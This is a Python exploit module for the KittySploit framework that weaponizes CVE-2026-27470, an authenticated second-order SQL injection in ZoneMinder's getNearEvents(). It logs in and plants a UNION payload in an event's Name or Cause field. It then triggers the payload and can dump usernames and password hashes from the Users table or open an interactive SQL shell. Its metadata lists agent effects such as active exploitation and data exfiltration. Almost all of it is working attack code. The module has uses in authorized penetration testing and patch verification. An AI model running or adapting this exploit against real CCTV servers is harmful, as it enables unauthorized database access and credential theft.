#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-27470 — ZoneMinder second-order SQLi via getNearEvents()."""

import re
from typing import Optional

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.sqli import Sqli


class Module(Auxiliary, Http_client, Sqli):
    __info__ = {
        "name": "ZoneMinder CVE-2026-27470 second-order SQLi",
        "description": (
            "Exploits CVE-2026-27470: authenticated second-order SQL injection in "
            "ZoneMinder getNearEvents() (web/ajax/status.php). Stores a UNION payload "
            "in Event Name/Cause (parameterized write), then triggers via "
            "entity=nearevents. Affected: <= 1.36.37 and 1.37.61–1.38.0. "
            "Fixed: 1.36.38 / 1.38.1. Requires Events view/edit permissions."
        ),
        "author": ["d3vn0mi", "KittySploit Team"],
        "cve": ["CVE-2026-27470"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-27470",
            "https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-r6gm-478g-f2c4",
            "https://github.com/d3vn0mi/CVE-2026-27470-POC",
        ],
        "tags": [
            "zoneminder",
            "cctv",
            "sqli",
            "second-order",
            "authenticated",
            "cve-2026-27470",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["zoneminder"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": True,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/index.php"],
                "param_any": ["request", "entity", "nearevents"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": "sqli"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(80, "ZoneMinder HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/zm", "ZoneMinder base path (often /zm or /)", required=False)
    username = OptString("admin", "ZoneMinder username", required=False)
    password = OptString("", "ZoneMinder password", required=True)
    action = OptString(
        "sql",
        "Action: test | sql | dump_users | shell",
        required=False,
    )
    field = OptString(
        "Name",
        "Injection carrier field: Name | Cause",
        required=False,
    )
    event_id = OptInteger(0, "Event ID carrier (0 = auto-detect first event)", required=False)
    restore = OptBool(True, "Restore event Name after exploitation", required=False)

    def __init__(self, framework=None):
        super().__init__(framework)
        self._csrf = ""
        self._event_id = None
        self._auth_disabled = False

    def _timeout(self) -> int:
        return max(int(self.timeout or 20), 15)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/")

    def _path(self, suffix: str = "/") -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        if base in ("", "/"):
            return suffix
        if suffix == "/":
            return base + "/"
        return base + suffix

    def _index(self) -> str:
        return self._path("/index.php")

    @staticmethod
    def _extract_csrf(text: str) -> str:
        match = re.search(r'csrfMagicToken\s*=\s*["\']([^"\']+)["\']', text or "")
        if match:
            return match.group(1)
        match = re.search(
            r'name=["\']__csrf_magic["\'][^>]*value=["\']([^"\']+)["\']',
            text or "",
            re.I,
        )
        return match.group(1) if match else ""

    def _login(self) -> bool:
        response = self.http_request(
            method="GET",
            path=self._path("/"),
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not response:
            response = self.http_request(
                method="GET",
                path=self._index(),
                timeout=self._timeout(),
                allow_redirects=True,
            )
        if not response:
            return False

        self._csrf = self._extract_csrf(response.text or "")
        final_url = getattr(response, "url", "") or ""
        if "privacy" in final_url.lower():
            self._auth_disabled = True
            print_status("ZM_OPT_USE_AUTH=0 — session without credentials")
            return True

        data = {
            "view": "login",
            "action": "login",
            "username": str(self.username or "admin"),
            "password": str(self.password or ""),
        }
        if self._csrf:
            data["__csrf_magic"] = self._csrf

        login = self.http_request(
            method="POST",
            path=self._index(),
            data=data,
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not login:
            return False

        self._csrf = self._extract_csrf(login.text or "") or self._csrf
        text = (login.text or "").lower()
        url = (getattr(login, "url", "") or "").lower()
        if "logout" in text or "console" in url:
            return True

        console = self.http_request(
            method="GET",
            path=self._index(),
            params={"view": "console"},
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if console and console.status_code == 200:
            curl = (getattr(console, "url", "") or "").lower()
            if "login" not in curl:
                self._csrf = self._extract_csrf(console.text or "") or self._csrf
                return True
        return False

    def _get_event_id(self) -> Optional[int]:
        configured = int(self.event_id or 0)
        if configured > 0:
            return configured

        response = self.http_request(
            method="GET",
            path=self._index(),
            params={
                "request": "status",
                "entity": "events",
                "sort_field": "Id",
                "sort_asc": "1",
                "limit": "1",
            },
            timeout=self._timeout(),
        )
        if not response or response.status_code != 200:
            return None
        try:
            data = response.json() or {}
            events = data.get("results") or data.get("events") or []
            if events:
                eid = events[0].get("Id") or events[0].get("id")
                return int(eid) if eid is not None else None
        except Exception:
            return None
        return None

    def _inject_payload(self, event_id: int, payload: str) -> bool:
        field = str(self.field or "Name").strip()
        if field.lower() == "cause":
            data = {
                "request": "event",
                "action": "edit",
                "id": str(event_id),
                "newEvent[Cause]": payload,
                "newEvent[Notes]": "kittysploit",
            }
        else:
            data = {
                "request": "event",
                "action": "rename",
                "id": str(event_id),
                "eventName": payload,
            }
        if self._csrf:
            data["__csrf_magic"] = self._csrf

        response = self.http_request(
            method="POST",
            path=self._index(),
            data=data,
            timeout=self._timeout(),
        )
        return bool(response and response.status_code == 200)

    def _trigger(self, event_id: int):
        field = str(self.field or "Name").strip() or "Name"
        return self.http_request(
            method="GET",
            path=self._index(),
            params={
                "request": "status",
                "entity": "nearevents",
                "id": str(event_id),
                "sort_field": field,
                "sort_asc": "1",
            },
            timeout=self._timeout(),
        )

    def _restore(self, event_id: int, original: str = "Event") -> None:
        if not self.restore:
            return
        data = {
            "request": "event",
            "action": "rename",
            "id": str(event_id),
            "eventName": original,
        }
        if self._csrf:
            data["__csrf_magic"] = self._csrf
        self.http_request(
            method="POST",
            path=self._index(),
            data=data,
            timeout=self._timeout(),
        )

    @staticmethod
    def _parse_result(response) -> Optional[str]:
        if not response:
            return None
        try:
            data = response.json() or {}
        except Exception:
            text = (response.text or "").strip()
            return text[:500] if text else None

        nearevents = data.get("nearevents") or {}
        if isinstance(nearevents, dict):
            for key in ("NextEventId", "PrevEventId", "NextEventStartTime", "PrevEventStartTime"):
                value = nearevents.get(key)
                if value not in (None, "", "0", 0):
                    return str(value)

        results = data.get("results") or data.get("data") or []
        if results and isinstance(results[0], dict):
            for key in ("Id", "id", "StartDateTime", "Name"):
                if results[0].get(key) is not None:
                    return str(results[0].get(key))
        return None

    def run_query(self, sql_query: str) -> Optional[str]:
        if self._event_id is None:
            self._event_id = self._get_event_id()
        if not self._event_id:
            print_error("No event ID available (set event_id or create an event)")
            return None

        # Events.Name is varchar(64) — keep payload short
        union_payload = f"' UNION SELECT ({sql_query}),NULL-- -"
        if len(union_payload) > 63:
            print_warning(
                f"Payload length {len(union_payload)} may exceed Events.Name varchar(64)"
            )

        if not self._inject_payload(self._event_id, union_payload):
            print_error("Failed to store payload (check Events edit permission)")
            return None

        response = self._trigger(self._event_id)
        result = self._parse_result(response)
        if self.restore:
            self._restore(self._event_id)
        return result

    def sqli_fetch_scalar(self, user_line: str) -> Optional[str]:
        raw = (user_line or "").strip().rstrip(";")
        if not raw:
            return None
        if raw.upper().startswith("SELECT "):
            query = raw
        else:
            query = f"SELECT {raw}"
        return self.run_query(query)

    def run(self):
        action = str(self.action or "sql").strip().lower()
        print_status("CVE-2026-27470 — ZoneMinder second-order SQLi (getNearEvents)")
        print_info(f"Target: {self.target}:{int(self.port)}{self._base()} action={action}")

        print_status("Authenticating...")
        if not self._login():
            print_error("Login failed")
            return False
        print_success("Session ready")

        self._event_id = self._get_event_id()
        if not self._event_id:
            print_error("No events found — set event_id to an existing event")
            return False
        print_info(f"Using event ID: {self._event_id}")

        if action == "test":
            result = self.run_query("SELECT VERSION()")
            if not result:
                print_error("Injection failed or empty result")
                return False
            print_success(f"VERSION(): {result}")
            return True

        if action in ("shell",) or self.shell_sqli:
            print_status("Starting SQLi handler (shell_sqli)")
            self.shell_sqli = True
            self.handler_sqli()
            return True

        if action in ("dump_users", "users"):
            count = self.run_query("SELECT COUNT(*) FROM Users")
            print_info(f"User count: {count}")
            dumped = 0
            for index in range(20):
                uname = self.run_query(f"SELECT Username FROM Users LIMIT {index},1")
                uname_str = str(uname or "").strip()
                if not uname_str or uname_str in ("None", "1") or uname_str.startswith("{"):
                    break
                passwd = self.run_query(f"SELECT Password FROM Users LIMIT {index},1")
                print_success(f"{uname_str}:{passwd}")
                dumped += 1
            if not dumped:
                print_error("No users dumped")
                return False
            return True

        if action == "sql":
            query = str(self.single_sql or "").strip() or "SELECT VERSION()"
            if not query.upper().startswith("SELECT "):
                query = f"SELECT {query}"
            result = self.run_query(query)
            if result is None:
                print_error("No data extracted")
                return False
            print_success(f"Result: {result}")
            return True

        print_error(f"Unknown action: {action}")
        print_info("Valid: test | sql | dump_users | shell")
        return False
